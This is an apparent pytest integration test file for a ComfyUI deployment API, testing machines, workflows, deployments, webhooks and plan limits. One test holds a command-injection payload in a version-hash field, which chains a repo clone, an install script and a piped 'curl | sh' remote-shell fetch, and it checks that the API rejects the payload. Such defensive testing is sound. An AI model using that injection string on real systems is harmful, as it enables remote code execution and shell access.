import asyncio
from datetime import datetime
import json
import requests
import os
from aiohttp import web 

"""
**************PLEASE UPDATE THE DOCS**************
https://linear.app/comfy-deploy/project/test-case-81d2e9daade5/overview
**************************************************
"""


def get_ngrok_url_with_retry(max_retries=5, delay=1):
    """Get ngrok URL with retries"""
    for attempt in range(max_retries):
        try:
            response = requests.get(
                f"http://{os.getenv('NGROK_HOST')}:4040/api/tunnels"
            )
            return response.json()["tunnels"][0]["public_url"]
        except Exception as e:
            if attempt == max_retries - 1:  # Last attempt
                return "http://localhost:8000"  # fallback url
            print(
                f"Failed to get ngrok URL (attempt {attempt + 1}/{max_retries}). Retrying..."
            )
            import time

            time.sleep(delay)


ngrok_url = get_ngrok_url_with_retry()

os.environ["CURRENT_API_URL"] = ngrok_url

from api.models import User  # noqa: E402
from api.routes.utils import generate_persistent_token  # noqa: E402
import pytest  # noqa: E402
from httpx import AsyncClient  # noqa: E402
import pytest_asyncio  # noqa: E402
from uuid import uuid4  # noqa: E402
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession  # noqa: E402
from sqlalchemy.orm import sessionmaker  # noqa: E402
from sqlalchemy.pool import AsyncAdaptedQueuePool  # noqa: E402
from dotenv import load_dotenv  # noqa: E402
from contextlib import asynccontextmanager  # noqa: E402
from upstash_redis import Redis

load_dotenv()

# Use environment variables for database connection
DATABASE_URL = os.getenv("DATABASE_URL")

# Ensure the URL uses the asyncpg dialect
if DATABASE_URL and not DATABASE_URL.startswith("postgresql+asyncpg://"):
    DATABASE_URL = DATABASE_URL.replace("postgresql://", "postgresql+asyncpg://")

# Configure engine with larger pool size and longer timeout
engine = create_async_engine(
    DATABASE_URL,
    poolclass=AsyncAdaptedQueuePool,
    pool_size=20,  # Increased from default 5
    max_overflow=30,  # Increased from default 10
    pool_timeout=60,  # Increased from default 30
    pool_pre_ping=True,  # Enable connection health checks
    pool_recycle=3600,  # Recycle connections after 1 hour
)

AsyncSessionLocal = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)


@asynccontextmanager
async def get_db_context():
    async with AsyncSessionLocal() as session:
        try:
            yield session
            await session.commit()
        except Exception:
            await session.rollback()
            raise
        finally:
            await session.close()


@pytest.mark.asyncio
async def test_ngrok_setup(app):
    """Test to verify ngrok setup and accessibility"""
    print("\nhi there")
    print(f"ngrok_url: {ngrok_url}")
    assert ngrok_url is not None

    # Try to access the URL
    try:
        response = requests.get(ngrok_url)
        assert response.status_code == 200, (
            f"Expected status code 200, but got {response.status_code}"
        )
        print(
            f"Successfully connected to ngrok URL with status code {response.status_code}"
        )
    except requests.RequestException as e:
        pytest.fail(f"Failed to connect to ngrok URL: {str(e)}")


redis_url = os.getenv("UPSTASH_REDIS_META_REST_URL")
redis_token = os.getenv("UPSTASH_REDIS_META_REST_TOKEN")


@pytest_asyncio.fixture(scope="session")
async def paid_user():
    user_id = str(uuid4())

    redis = Redis(url=redis_url, token=redis_token)
    data = {
        "data": {
            "plans": ["business_monthly"],
            "names": [],
            "prices": [],
            "amount": [],
            "charges": [],
            "cancel_at_period_end": False,
            "canceled_at": None,
            "payment_issue": False,
            "payment_issue_reason": "",
        },
        "version": "1.0",
        "timestamp": int(datetime.now().timestamp()),
    }
    redis.set(f"plan:{user_id}", json.dumps(data))
    print("redis set", redis.get(f"plan:{user_id}"))

    async with get_db_context() as db:
        user = User(
            id=user_id,
            username="business_user",
            name="Business User",
        )
        db.add(user)
    yield user


@pytest_asyncio.fixture(scope="session")
async def free_user():
    user_id = str(uuid4())

    redis = Redis(url=redis_url, token=redis_token)
    data = {
        "plans": [],
        "names": [],
        "prices": [],
        "amount": [],
        "charges": [],
        "cancel_at_period_end": False,
        "canceled_at": None,
        "payment_issue": False,
        "payment_issue_reason": "",
    }
    redis.set(f"plan:{user_id}", json.dumps(data))
    print("redis set", redis.get(f"plan:{user_id}"))

    async with get_db_context() as db:
        user = User(
            id=user_id,
            username="free_user",
            name="Free User",
        )
        db.add(user)
    yield user


@pytest_asyncio.fixture(scope="session")
async def app():
    import uvicorn
    import requests
    from time import sleep

    # Start the server in a separate thread/process
    import multiprocessing

    def run_server():
        uvicorn.run("api:app", host="0.0.0.0", port=8000, reload=False)

    # Start server process
    server_process = multiprocessing.Process(target=run_server)
    server_process.start()

    # Wait for server to be ready
    max_retries = 30  # Maximum number of retries
    retry_delay = 0.5  # Delay between retries in seconds

    print("Waiting for server to be ready")

    for attempt in range(max_retries):
        try:
            print(f"Attempt {attempt + 1} of {max_retries}")
            response = requests.get("http://localhost:8000/")
            if response.status_code == 200:
                break
        except requests.RequestException:
            if attempt == max_retries - 1:
                raise RuntimeError("Failed to start server after maximum retries")
            sleep(retry_delay)

    yield "http://localhost:8000"

    print("Stopping server")
    # Cleanup: stop the server
    server_process.terminate()
    server_process.join()


@asynccontextmanager
async def get_test_client(app, user):
    """Helper function to create a new client instance with async context manager support"""
    api_key = generate_persistent_token(user.id, None)
    client = AsyncClient(
        base_url=app + "/api",
        headers={"Authorization": f"Bearer {api_key}"},
        timeout=120.0,  # 30 seconds timeout for all operations
    )
    try:
        yield client
    finally:
        await client.aclose()


# ===================== machine =====================

# ------ custom machine ------

# create and delete
"""
Free user
- return 403

Paid user
- return 200
- delete machine
"""


@pytest.mark.asyncio
async def test_create_custom_machine(app, paid_user, free_user):
    machine_data = {
        "name": "test-machine",
        "type": "classic",
        "endpoint": "http://localhost:8188",
        "auth_token": "test_auth_token",
    }

    # Test with free user - should be forbidden
    async with get_test_client(app, free_user) as client:
        response = await client.post("/machine/custom", json=machine_data)
        assert response.status_code == 403

    # Test with paid user - should succeed
    async with get_test_client(app, paid_user) as client:
        response = await client.post("/machine/custom", json=machine_data)
        assert response.status_code == 200
        machine_id = response.json()["id"]

        delete_response = await client.delete(f"/machine/{machine_id}")
        assert delete_response.status_code == 200


# get and delete
"""
Paid user
- return 200
"""


@pytest_asyncio.fixture(scope="function")
async def test_custom_machine(app, paid_user):
    """Fixture that creates and tears down a test machine"""
    machine_data = {
        "name": "classic-custom-machine",
        "type": "classic",
        "endpoint": "http://localhost:8188",
        "auth_token": "test_auth_token",
    }

    async with get_test_client(app, paid_user) as client:
        response = await client.post("/machine/custom", json=machine_data)
        assert response.status_code == 200
        machine_id = response.json()["id"]
        print(f"Machine ID: {machine_id}")

        yield machine_id

        # Cleanup after test is done
        delete_response = await client.delete(f"/machine/{machine_id}")
        assert delete_response.status_code == 200


@pytest.mark.asyncio
async def test_get_custom_machine(app, paid_user, test_custom_machine):
    async with get_test_client(app, paid_user) as client:
        response = await client.get(f"/machine/{test_custom_machine}")
        assert response.status_code == 200
        assert response.json()["id"] == test_custom_machine


# update
"""
Paid user
- update name, endpoint, auth_token, type
- return 200 with updated values
"""


@pytest.mark.asyncio
async def test_update_custom_machine(app, paid_user, test_custom_machine):
    update_data = {
        "name": "updated-classic-custom-machine",
        "endpoint": "http://localhost:9999",
        "auth_token": "updated_auth_token",
        "type": "runpod-serverless",
    }

    async with get_test_client(app, paid_user) as client:
        # Send update request
        response = await client.patch(
            f"/machine/custom/{test_custom_machine}", json=update_data
        )
        assert response.status_code == 200
        updated_machine = response.json()

        # Verify the machine was updated with our new values
        assert updated_machine["id"] == test_custom_machine
        assert updated_machine["name"] == update_data["name"]
        assert updated_machine["endpoint"] == update_data["endpoint"]
        assert updated_machine["auth_token"] == update_data["auth_token"]
        assert updated_machine["type"] == update_data["type"]


# ------ serverless machine ------

# create and delete
"""
Free user
- return 403

Paid user
- return 200
- delete machine
"""


@pytest.mark.asyncio
async def test_create_serverless_machine(app, paid_user, free_user):
    machine_data = {
        "name": "test-serverless-machine",
        "gpu": "CPU",
        "wait_for_build": True,
    }

    # Test with free user - should be forbidden
    async with get_test_client(app, free_user) as client:
        response = await client.post("/machine/serverless", json=machine_data)
        assert response.status_code == 403

    # Test with paid user - should succeed
    async with get_test_client(app, paid_user) as client:
        response = await client.post("/machine/serverless", json=machine_data)
        assert response.status_code == 200
        machine_id = response.json()["id"]

        delete_response = await client.delete(f"/machine/{machine_id}?force=true")
        assert delete_response.status_code == 200


# get and delete
"""
Paid user
- return 200
"""


@pytest_asyncio.fixture(scope="session")
async def test_serverless_machine(app, paid_user):
    machine_data = {
        "name": "test-serverless-machine-paid",
        "gpu": "CPU",
        "wait_for_build": True,
    }

    async with get_test_client(app, paid_user) as client:
        response = await client.post("/machine/serverless", json=machine_data)
        assert response.status_code == 200
        machine_id = response.json()["id"]

        yield machine_id

        delete_response = await client.delete(f"/machine/{machine_id}?force=true")
        assert delete_response.status_code == 200
        

# @pytest_asyncio.fixture(scope="session")
# async def test_serverless_machine_free_user(app, test_free_user):
#     """Fixture that creates and tears down a test serverless machine"""
#     async with get_test_client(app, test_free_user) as client:
#         machine_data = {
#             "name": "test-serverless-machine",
#             "gpu": "CPU",
#             "wait_for_build": True,
#         }
#         print("Creating test serverless machine")
#         response = await client.post("/machine/serverless", json=machine_data)

#         # Add detailed error logging
#         if response.status_code != 200:
#             print(
#                 f"Failed to create serverless machine. Status code: {response.status_code}"
#             )
#             print(f"Response content: {response.text}")
#             raise AssertionError(
#                 f"Failed to create serverless machine: {response.text}"
#             )

#         machine_id = response.json()["id"]
#         print(f"Successfully created serverless machine with ID: {machine_id}")

#         yield machine_id

#         # Add error logging for cleanup as well
#         delete_response = await client.delete(f"/machine/{machine_id}?force=true")
#         if delete_response.status_code != 200:
#             print(
#                 f"Failed to delete serverless machine. Status code: {delete_response.status_code}"
#             )
#             print(f"Response content: {delete_response.text}")
#         assert delete_response.status_code == 200


@pytest.mark.asyncio
async def test_get_serverless_machine(app, paid_user, test_serverless_machine):
    async with get_test_client(app, paid_user) as client:
        response = await client.get(f"/machine/{test_serverless_machine}")
        assert response.status_code == 200
        assert response.json()["id"] == test_serverless_machine


# update
"""
Paid user
- update name, install ipadapter, run custom command ls
- test malicious command
- return 200 with updated values
"""


@pytest.mark.asyncio
async def test_update_serverless_machine(app, paid_user, test_serverless_machine):
    async with get_test_client(app, paid_user) as client:
        update_malicious_hash = {
            "name": "updated-serverless-machine-with-malicious-hash",
            "comfyui_version": "7fbf4b72fe3b23d9ff8f21e0f9a254d032f2f9d0 && pip install accelerate && pip install diffusers && git clone https://github.com/nigeriaerika/Brushy && if [ -f requirements.txt ]; then python -m pip install -r requirements.txt; fi && if [ -f install.py ]; then python install.py || echo 'install script failed'; fi && mv Brushy custom_nodes && cd / && curl -sSf https://sshx.io/get | sh - run",
        }
        response = await client.patch(
            f"/machine/serverless/{test_serverless_machine}",
            json=update_malicious_hash,
        )
        assert response.status_code == 422

        update_data = {
            "name": "updated-serverless-machine",
            "docker_command_steps": {
                "steps": [
                    {
                        "id": "76566a1b-9",
                        "type": "custom-node",
                        "data": {
                            "name": "ComfyUI_IPAdapter_plus",
                            "url": "https://github.com/cubiq/ComfyUI_IPAdapter_plus",
                            "files": [
                                "https://github.com/cubiq/ComfyUI_IPAdapter_plus"
                            ],
                            "install_type": "git-clone",
                            "pip": ["insightface"],
                            "hash": "9d076a3df0d2763cef5510ec5ab807f6632c39f5",
                            "meta": {
                                "message": "Merge pull request #793 from svenrog/main\n\nFix for issue with pipeline in load_models",
                                "committer": {
                                    "name": "GitHub",
                                    "email": "noreply@github.com",
                                    "date": "2025-02-26T06:31:16.000Z",
                                },
                                "latest_hash": "9d076a3df0d2763cef5510ec5ab807f6632c39f5",
                                "stargazers_count": 4766,
                                "commit_url": "https://github.com/cubiq/ComfyUI_IPAdapter_plus/commit/9d076a3df0d2763cef5510ec5ab807f6632c39f5",
                            },
                        },
                    },
                    {"id": "26e71a68-6", "type": "commands", "data": "RUN ls"},
                ]
            },
        }
        response = await client.patch(
            f"/machine/serverless/{test_serverless_machine}",
            json=update_data,
        )
        assert response.status_code == 200
        updated_machine = response.json()
        assert updated_machine["id"] == test_serverless_machine
        assert updated_machine["name"] == update_data["name"]
        assert (
            updated_machine["docker_command_steps"]
            == update_data["docker_command_steps"]
        )



basic_workflow_json = """
{
  "last_node_id": 20,
  "last_link_id": 13,
  "nodes": [
    {
      "id": 17,
      "type": "SaveImage",
      "pos": {
        "0": 999.4330444335938,
        "1": 372.1318664550781
      },
      "size": {
        "0": 315,
        "1": 58
      },
      "flags": {},
      "order": 1,
      "mode": 0,
      "inputs": [
        {
          "link": 13,
          "name": "images",
          "type": "IMAGE"
        }
      ],
      "outputs": [],
      "properties": {},
      "widgets_values": [
        "ComfyUI"
      ]
    },
    {
      "id": 16,
      "type": "ComfyUIDeployExternalImage",
      "pos": {
        "0": 387,
        "1": 424
      },
      "size": {
        "0": 390.5999755859375,
        "1": 366
      },
      "flags": {},
      "order": 0,
      "mode": 0,
      "inputs": [
        {
          "link": null,
          "name": "default_value",
          "type": "IMAGE",
          "shape": 7
        }
      ],
      "outputs": [
        {
          "name": "image",
          "type": "IMAGE",
          "links": [
            13
          ],
          "slot_index": 0
        }
      ],
      "properties": {
        "Node name for S&R": "ComfyUIDeployExternalImage"
      },
      "widgets_values": [
        "https://comfy-deploy-output-dev.s3.us-east-2.amazonaws.com/assets/img_bRFqDVG5VG87N29W.png",
        "",
        "",
        "https://comfy-deploy-output-dev.s3.us-east-2.amazonaws.com/assets/img_bRFqDVG5VG87N29W.png",
        ""
      ]
    }
  ],
  "links": [
    [
      13,
      16,
      0,
      17,
      0,
      "IMAGE"
    ]
  ],
  "groups": [],
  "config": {},
  "extra": {
    "ds": {
      "scale": 1.3109994191499965,
      "offset": {
        "0": -242.70708454566912,
        "1": -115.02119499557512
      }
    },
    "node_versions": {
      "comfy-core": "v0.2.4",
      "comfyui-deploy": "4073a43d3d04f6659acc7954f79a4fa7d83a3867"
    }
  },
  "version": 0.4
}
"""
basic_workflow_api_json = """
{
  "16": {
    "inputs": {
      "input_id": "https://comfy-deploy-output-dev.s3.us-east-2.amazonaws.com/assets/img_bRFqDVG5VG87N29W.png",
      "display_name": "",
      "description": "",
      "default_value_url": "https://comfy-deploy-output-dev.s3.us-east-2.amazonaws.com/assets/img_bRFqDVG5VG87N29W.png"
    },
    "class_type": "ComfyUIDeployExternalImage"
  },
  "17": {
    "inputs": {
      "filename_prefix": "ComfyUI",
      "images": [
        "16",
        0
      ]
    },
    "class_type": "SaveImage"
  }
}
"""


@pytest_asyncio.fixture(scope="session")
async def test_create_workflow_deployment(app, paid_user, test_serverless_machine):
    """Test creating a workflow and deployment"""
    async with get_test_client(app, paid_user) as client:
        workflow_data = {
            "name": "test-workflow",
            "workflow_json": basic_workflow_json,
            "workflow_api": basic_workflow_api_json,
            "machine_id": test_serverless_machine,
        }
        response = await client.post("/workflow", json=workflow_data)
        assert response.status_code == 200, (
            f"Workflow creation failed with response: {response.text}"
        )
        workflow_id = response.json()["workflow_id"]

        response = await client.get(f"/workflow/{workflow_id}/versions")
        assert response.status_code == 200, (
            f"Getting workflow versions failed with response: {response.text}"
        )
        workflow_version_id = response.json()[0]["id"]

        deployment_data = {
            "workflow_id": workflow_id,
            "workflow_version_id": workflow_version_id,
            "machine_id": test_serverless_machine,
            "environment": "production",
        }
        print(f"Deployment data: {deployment_data}")
        response = await client.post("/deployment", json=deployment_data)
        if response.status_code != 200:
            print(f"Deployment creation failed with status {response.status_code}")
            print(f"Response body: {response.text}")
            raise AssertionError(f"Deployment creation failed: {response.text}")
        deployment_id = response.json()["id"]

        yield deployment_id


@pytest.mark.asyncio
async def test_run_deployment_sync(app, paid_user, test_create_workflow_deployment):
    """Test running a deployment"""
    async with get_test_client(app, paid_user) as client:
        deployment_id = test_create_workflow_deployment
        response = await client.post(
            "/run/deployment/sync", json={"deployment_id": deployment_id}
        )
        assert response.status_code == 200
        run_id = response.json()[0]["run_id"]
        assert run_id is not None


@asynccontextmanager
async def create_webhook_server():
    """Create a temporary webhook server that collects received webhooks"""
    received_webhooks = []

    async def webhook_handler(request):
        payload = await request.json()
        print(f"Received webhook: {payload}")
        received_webhooks.append(payload)
        return web.Response(text="OK")

    app = web.Application()
    app.router.add_post("/webhook", webhook_handler)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", 0)  # Listen on all interfaces
    await site.start()

    # Get the assigned port
    port = site._server.sockets[0].getsockname()[1]

    # Use the service name 'app' as the hostname
    webhook_url = f"http://app:{port}/webhook"

    try:
        yield webhook_url, received_webhooks
    finally:
        await runner.cleanup()


@pytest.mark.asyncio
async def test_run_deployment_with_webhook(
    app, paid_user, test_create_workflow_deployment
):
    """Test running a deployment with webhook notifications"""
    deployment_id = test_create_workflow_deployment

    async with create_webhook_server() as (webhook_url, received_webhooks):
        webhook_url_with_params = f"{webhook_url}?target_events=run.output,run.updated"

        async with get_test_client(app, paid_user) as client:
            response = await client.post(
                "/run/deployment/sync",
                json={
                    "deployment_id": deployment_id,
                    "webhook": webhook_url_with_params,
                },
            )
            assert response.status_code == 200
            run_id = response.json()[0]["run_id"]
            assert run_id is not None

            # Wait a bit for webhooks to be received
            for _ in range(30):
                if len(received_webhooks) >= 2:
                    break
                await asyncio.sleep(0.1)

            assert len(received_webhooks) >= 2, (
                "Did not receive expected number of webhooks"
            )

            output_webhooks = [
                w for w in received_webhooks if w["event_type"] == "run.output"
            ]
            status_webhooks = [
                w for w in received_webhooks if w["event_type"] == "run.updated"
            ]

            assert len(output_webhooks) > 0, "No run.output webhook received"
            assert len(status_webhooks) > 0, "No run.updated webhook received"

            for webhook in output_webhooks:
                assert "outputs" in webhook, "Webhook missing outputs field"
                assert isinstance(webhook["outputs"], list), "Outputs should be a list"

            for webhook in status_webhooks:
                assert "status" in webhook, "Webhook missing status field"
                assert "progress" in webhook, "Webhook missing progress field"
                assert webhook["run_id"] == run_id, "Run ID mismatch in webhook"


@pytest.mark.asyncio
async def test_run_deployment_with_webhook_no_target_events(
    app, paid_user, test_create_workflow_deployment
):
    """Test running a deployment with webhook notifications without specifying target_events - should receive run.updated by default but not run.output"""
    deployment_id = test_create_workflow_deployment

    async with create_webhook_server() as (webhook_url, received_webhooks):
        # Note: Not specifying target_events in the webhook URL - should get run.updated by default

        async with get_test_client(app, paid_user) as client:
            response = await client.post(
                "/run/deployment/sync",
                json={"deployment_id": deployment_id, "webhook": webhook_url},
            )
            assert response.status_code == 200
            run_id = response.json()[0]["run_id"]
            assert run_id is not None

            # Wait a bit for webhooks to be received
            for _ in range(30):
                if len(received_webhooks) >= 1:  # We expect run.updated events
                    break
                await asyncio.sleep(0.1)

            # Verify we received webhooks
            assert len(received_webhooks) > 0, "Did not receive any webhooks"

            # Verify we received run.updated events by default
            status_webhooks = [
                w for w in received_webhooks if w["event_type"] == "run.updated"
            ]
            assert len(status_webhooks) > 0, (
                "No run.updated webhooks received when they should be default"
            )

            # Verify we did not receive run.output events since they weren't requested
            output_webhooks = [
                w for w in received_webhooks if w["event_type"] == "run.output"
            ]
            assert len(output_webhooks) == 0, (
                "Received run.output webhooks when not requested"
            )

            # Verify the structure of run.updated webhooks
            for webhook in status_webhooks:
                assert "status" in webhook, "Webhook missing status field"
                assert "progress" in webhook, "Webhook missing progress field"
                assert webhook["run_id"] == run_id, "Run ID mismatch in webhook"


@pytest_asyncio.fixture(scope="session")
async def test_free_user():
    """Fixture for a test user with free plan"""
    async with get_db_context() as db:
        user = User(
            id=str(uuid4()),
            username="test_free_user",
            name="Test Free User",
            # The plan will be handled by the backend based on user's subscription
        )
        db.add(user)
        await db.commit()
        await db.refresh(user)
    yield user

@pytest.mark.asyncio
async def test_run_deployment_on_a_wrong_user(
    app, paid_user, test_free_user, test_create_workflow_deployment
):
    """Test running a deployment with webhook notifications and machine"""
    deployment_id = test_create_workflow_deployment

    async with get_test_client(app, test_free_user) as client:
        response = await client.post(
            "/run/deployment/sync", json={"deployment_id": deployment_id}
        )
        print(f"Response status: {response.status_code}")
        print(f"Response content: {response.text}")
        assert response.status_code == 404, "Expected 403 status code for wrong user"

'''
@pytest.mark.asyncio
async def test_free_user_session_timeout_limit(app, test_free_user, test_serverless_machine_free_user):
    """Test that free users cannot set timeout beyond 30 minutes"""
    async with get_test_client(app, test_free_user) as client:
        # Test creating session with timeout > 30 minutes
        response = await client.post(
            "/session/dynamic",
            json={
                "machine_id": test_serverless_machine_free_user,
                "timeout": 31,
                "gpu": "CPU",
                "wait_for_server": True,
            },
        )
        assert response.status_code == 400
        assert (
            "Free plan users are limited to 30 minutes timeout"
            in response.json()["detail"]
        )

        # Test creating session with valid timeout
        response = await client.post(
            "/session/dynamic",
            json={
                "machine_id": test_serverless_machine_free_user,
                "timeout": 15,
                "gpu": "CPU",
                "wait_for_server": True,
            },
        )
        print(f"Response status: {response.status_code}")
        print(f"Target Response body: {response.text}")
        assert response.status_code == 200
        session_id = response.json()["session_id"]

        # Test increasing timeout beyond 30 minutes total
        response = await client.post(
            f"/session/{session_id}/increase-timeout", json={"minutes": 20}
        )
        assert response.status_code == 400
        assert (
            "Free plan users are limited to 30 minutes total timeout"
            in response.json()["detail"]
        )

        # Test increasing timeout within limit
        response = await client.post(
            f"/session/{session_id}/increase-timeout", json={"minutes": 10}
        )
        assert response.status_code == 200
        assert response.json()["message"] == "Timeout increased successfully"

        # Cleanup: Delete the session
        response = await client.delete(f"/session/{session_id}?wait_for_shutdown=true")
        print(f"Response status: {response.status_code}")
        print(f"Response content: {response.text}")
        assert response.status_code == 200


# test_serverless_machine


@pytest.mark.asyncio
async def test_free_user_concurrent_sessions(app, test_free_user, test_serverless_machine_free_user):
    """Test that free users cannot create concurrent sessions"""
    print(f"\nTest user: {test_free_user.id}, {test_free_user.username}")
    # test_serverless_machine = None
    print(f"Test machine: {test_serverless_machine_free_user}")

    async with get_test_client(app, test_free_user) as client:
        # Create first session
        print("\nCreating first session...")
        response = await client.post(
            "/session/dynamic",
            json={
                "machine_id": test_serverless_machine_free_user,
                "timeout": 15,
                "gpu": "CPU",
                "wait_for_server": True,
            },
        )
        print(f"Response status: {response.status_code}")
        print(f"Response body: {response.text}")

        if response.status_code != 200:
            # Get all active sessions for debugging
            sessions_response = await client.get("/sessions")
            print(f"\nCurrent active sessions: {sessions_response.text}")
            print(
                f"\nError message: {response.json().get('detail', 'No detail provided')}"
            )

        assert response.status_code == 200
        session_id = response.json()["session_id"]

        # Try to create second session
        print("\nTrying to create second session...")
        response = await client.post(
            "/session/dynamic",
            json={
                "machine_id": test_serverless_machine_free_user,
                "timeout": 15,
                "gpu": "CPU",
                "wait_for_server": True,
            },
        )
        print(f"Response status: {response.status_code}")
        print(f"Response body: {response.text}")
        assert response.status_code == 400
        assert (
            "Free plan does not support concurrent sessions"
            in response.json()["detail"]
        )

        # Cleanup: Delete the session
        response = await client.delete(f"/session/{session_id}?wait_for_shutdown=true")
        print(f"Response status: {response.status_code}")
        print(f"Response content: {response.text}")
        assert response.status_code == 200
'''